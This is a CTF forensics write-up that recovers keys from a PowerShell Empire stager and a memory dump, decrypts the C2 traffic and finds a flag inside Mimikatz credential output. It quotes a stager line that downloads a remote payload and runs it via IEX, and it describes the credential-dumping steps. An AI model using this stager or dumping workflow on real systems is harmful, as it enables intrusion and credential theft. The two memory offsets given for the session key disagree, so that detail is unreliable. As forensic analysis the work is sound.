# The Empire is at Risk — Forensics / Malware Analysis

**CTF:** ADF 2026 Hackathon  
**Category:** Forensics / Malware Analysis  
**Challenge:** The Empire is at Risk  
**Flag:** `HTB{th3_3mp1r3_F1n4lly_C0ll4ps3d}`

---

## Scenario

> As the Empire continued to expand its territories, the smaller yet free remained galaxies in the universe feared for the worst. Rumor has it that they have developed a Command & Control Server, stealthy enough to penetrate even the most hardened systems. Here are a network capture and a process dump of a recent incident in which it is believed the Empire was involved. Can you find a way to decrypt the communications and find out what happened?

We are provided with two artefacts:
- `capture.pcap` — 6,443 packets, ~6MB PCAP (Ethernet, ~234 seconds)
- `powershell.DMP` — 248MB Windows minidump (17 streams, PowerShell.exe process)

---

## Analysis

### 1. Initial Triage

**PCAP findings:**
- C2 Server: `77.74.198.52:8083` (Werkzeug/2.1.2 Python/3.9.13)
- Victim: `192.168.1.5` (SATELLITE-2341, Windows 10 Enterprise)
- User: `CORP\SatAdministrator`
- Raw TCP shell on port `4444` — attacker's initial foothold
- HTTP C2 traffic: `/news.php`, `/login/process.php`, `/admin/get.php` — classic Empire C2 URIs
- User-Agent: `Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko`

**Port 4444 shell commands:**
```
whoami
corp\satadministrator
PS C:\Windows\system32> powershell -noP -sta -w 1 -enc <base64_stager>
```

The attacker gained initial access via a raw TCP shell on port 4444 and then deployed a PowerShell Empire stager.

### 2. Extracting the Staging Key

The base64-encoded PowerShell stager from the port 4444 shell (frames 28–34) revealed the RC4 staging key:

```powershell
$K=[System.Text.Encoding]::ASCII.GetBytes('ewtVZiN~5)13Cx.M@oOJyp^G>TRWq(#b');
$R={...RC4 function...};
$data=$wc.DownloadData($ser+$t);
$iv=$data[0..3];
$data=$data[4..$data.length];
-join[Char[]](& $R $data ($IV+$K))|IEX
```

**Staging Key:** `ewtVZiN~5)13Cx.M@oOJyp^G>TRWq(#b`

### 3. Empire Packet Protocol

Empire's communication uses a two-layer encryption scheme:

```
┌──────────────┬─────────────────────┬──────────────────────────────┐
│ RC4 IV       │ RC4-encrypted       │ AES-CBC/HMAC payload         │
│ 4 bytes      │ routing header      │ length bytes                  │
└──────────────┴─────────────────────┴──────────────────────────────┘
                 16 bytes
```

**Outer layer (RC4):**
- Key: `RC4_IV (4 bytes) || staging_key (32 bytes)`
- Encrypts: 16-byte routing header
- RC4 IV is the first 4 bytes of the HTTP body

**Routing header (16 bytes, after RC4 decryption):**

| Offset | Size | Field |
|--------|------|-------|
| 0 | 8 | Session ID (e.g., "EBXWPAHZ") |
| 8 | 1 | Language |
| 9 | 1 | Meta type |
| 10 | 2 | Extra/reserved |
| 12 | 4 | Payload length (LE) |

**Meta type values:**
- `1` = STAGE0
- `2` = STAGE1 (HMAC key = **staging key**)
- `3` = STAGE2 (HMAC key = session key)
- `4` = TASKING_REQUEST
- `5` = RESULT_POST
- `6` = SERVER_RESPONSE

**Inner layer (AES-256-CBC + HMAC-SHA256):**
- Format: `AES_IV (16 bytes) || ciphertext (PKCS7 padded) || HMAC (first 10 bytes of SHA256)`
- HMAC covers: `AES_IV || ciphertext`
- HMAC key: staging key (`meta=2`) or session key (`meta>2`)

### 4. Recovering the Session Key

The Empire agent negotiates the AES session key via RSA key exchange during the initial staging phase. Searching the PowerShell process dump for high-entropy 32-character strings near Empire agent metadata (session ID `EBXWPAHZ`, agent metadata at offset `0x2476731`) yielded:

**Session Key:** `d%~gc_:vhZP+.VHWsolQEz1}ICKma;D@`

This key decrypts all server→agent traffic and all agent→server task results.

### 5. Decrypting Stage 0 and Stage 1

**Stage 0** (frame 46, `GET /news.php` response): RC4-decrypted with the staging key, yielding the PowerShell Empire agent bootstrap (~7.4KB).

**Stage 1** (frame 111, `POST /admin/get.php` response): AES-decrypted with the session key after removing the 20-byte routing prefix, yielding the full Empire agent module (LRFT7 function, ~41KB) with Encrypt-Bytes, Decrypt-Bytes, New-RoutingPacket, Invoke-ShellCommand, and more.

### 6. Decrypting Task Packets

**Task Response 1** (frame 2277, 1.7MB, meta=6): Contains a Mimikatz DLL payload (base64-encoded, `event::drop` command).

**Task Response 2** (frame 6380, 3.6MB, meta=6): Contains the `YAQ08` credential dumping PowerShell module, ending with:
```
YAQ08 -DumpCreds;
```

### 7. Extracting the Flag

The agent ran the credential dumper and sent results back via `POST /news.php` at frame 6400 (9,966 bytes). After decrypting the outer RC4 + inner AES layers and parsing the inner result packet format (`type || total || number || task_id || length || base64_data`), the Mimikatz output revealed:

```
Authentication Id : 0 ; 332550
User Name         : SatAdministrator
Domain            : CORP
        msv :
         * Username : SatAdministrator
         * Domain   : CORP
         * NTLM     : a9fdfa038c4b75ebc76dc855dd74f0da
        credman :
         [00000000]
         * Username : Administrator
         * Domain   : corp-dc
         * Password : HTB{th3_3mp1r3_F1n4lly_C0ll4ps3d}
```

**Flag: `HTB{th3_3mp1r3_F1n4lly_C0ll4ps3d}`**

---

## How We Solved It — Reasoning

### Key Insight 1: Stager analysis reveals the staging key

The attacker's port 4444 telnet session contained a full, unobfuscated PowerShell stager. Unlike the HTTP-embedded Empire stagers that are heavily obfuscated, this one was deployed manually and contained the RC4 staging key in cleartext. We extracted it by decoding the base64 `-enc` payload from frames 28–34.

### Key Insight 2: Session key in memory dump

The Empire PowerShell agent stores its AES session key as a script-scoped variable in the PowerShell process. By searching the memory dump for 32-character printable strings with high entropy (>0.85) near known Empire metadata (session ID, agent info pipe-delimited string), we found the key at offset `0x2479421`. The key is 1,788 bytes after the agent metadata string.

### Key Insight 3: Meta-dependent HMAC key selection

The critical mistake in earlier decryption attempts was using the session key for ALL HMAC verifications. Empire's protocol uses different keys depending on the `meta` field in the routing header:

- `meta=2` (STAGE1): HMAC with **staging key** — this is the RSA public key exchange POST
- `meta=3` (STAGE2): HMAC with **session key** — agent registration
- `meta=5` (RESULT_POST): HMAC with **session key** — task results
- `meta=6` (SERVER_RESPONSE): HMAC with **session key** — task/download data

Once the correct key was used per meta type, all HMAC verifications passed and all traffic was decryptable.

### Dead Ends & Rejected Hypotheses

1. **Brute-forcing Empire server passwords** — We tried ~50 common Empire default staging passwords (frame 111 AES decryption) before finding the key in memory.
2. **RSA key extraction from dump** — The 2048-bit RSA private key used in negotiation was generated with `UseMachineKeyStore` and was not recoverable from the process dump as a complete key blob. Fortunately, the session key itself was stored in memory.
3. **Single-key assumption** — Initially assumed all traffic uses one key. The meta-dependent key selection was only discovered after the subagent's protocol analysis confirmed the correct HMAC key assignment.

---

## Attack Chain Summary

| Step | Time (UTC) | Event |
|------|-----------|-------|
| 1 | 19:35:06 | Attacker connects to port 4444 (raw TCP shell) |
| 2 | 19:35:09 | `whoami` → `CORP\SatAdministrator` |
| 3 | 19:35:22–49 | Empire stager deployed via `powershell -enc` |
| 4 | 19:35:50 | Stage0 download (GET /news.php) |
| 5 | 19:35:51 | RSA key exchange (POST /login/process.php) |
| 6 | 19:35:51 | Agent registration + Stage1 download |
| 7 | 19:36:12–19:38:31 | Periodic tasking checks |
| 8 | 19:37:41 | C2 pushes Mimikatz DLL (1.7MB) |
| 9 | 19:38:31 | C2 pushes YAQ08 credential dumper (3.6MB) |
| 10 | 19:38:47 | Agent returns credential dump with flag |

---

## Key Takeaways

- **Empire C2 uses a two-layer encryption scheme**: RC4 (staging key) for routing/authentication, AES-256-CBC (session key) for payload. Both keys can be recovered through memory forensics.
- **The HMAC key depends on the packet `meta` type**, not a single global key — a nuance that's easy to miss when reading the agent source code.
- **Process memory dumps are gold for C2 forensics**: The AES session key was sitting in plaintext in the PowerShell process heap, just 1.8KB from the agent metadata string.
- **Stagers deployed via raw shells may lack obfuscation**: The attacker used a cleartext PowerShell stager on port 4444, revealing the RC4 staging key directly.
